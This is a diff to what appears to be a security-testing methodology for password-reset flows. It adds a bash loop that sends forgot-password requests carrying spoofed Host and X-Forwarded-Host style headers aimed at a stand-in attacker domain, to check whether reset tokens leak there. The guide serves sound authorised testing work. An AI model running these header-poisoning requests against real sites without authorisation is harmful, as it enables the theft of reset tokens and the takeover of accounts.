@@ -83,7 +83,21 @@ chains_with: [host-header, rate-limiting, session-management]
    # diff response body/length/timing
    ```
 
-8. **Host-header-based poisoning** (cross-reference, run the actual technique from host-header): confirm whether the reset link's domain is derived from the request's Host — if so, this flow's token can be exfiltrated to an attacker domain.
+8. **Host-header-based poisoning** (cross-reference, run the actual technique from host-header): confirm whether the reset link's domain is derived from the request's Host — if so, this flow's token can be exfiltrated to an attacker domain. Test all proxy-related headers, not just `Host`:
+   ```bash
+   for hdr in "Host: evil.test" \
+              "X-Forwarded-Host: evil.test" \
+              "X-Original-Host: evil.test" \
+              "X-Forwarded-Server: evil.test" \
+              "Forwarded: host=evil.test"; do
+     curl -s -X POST https://target.com/forgot-password \
+       -H "$hdr" -d "email=testuser@yourdomain.com"
+   done
+   # check test inbox: any reset link pointing to evil.test = confirmed poisoning
+   ```
+   Many reverse-proxy setups (nginx, Apache, Cloudflare) pass `X-Forwarded-Host` through even
+   when `Host` is locked. Frameworks that rebuild URLs from request headers (Django's
+   `get_host()`, Laravel's `url()`, Rails `request.host`) often trust these headers by default.
 
 9. **Password strength/reuse check after reset.** Confirm the new password set via reset is subject to the same strength policy as normal signup (sometimes the reset endpoint is a legacy path with weaker validation).
 
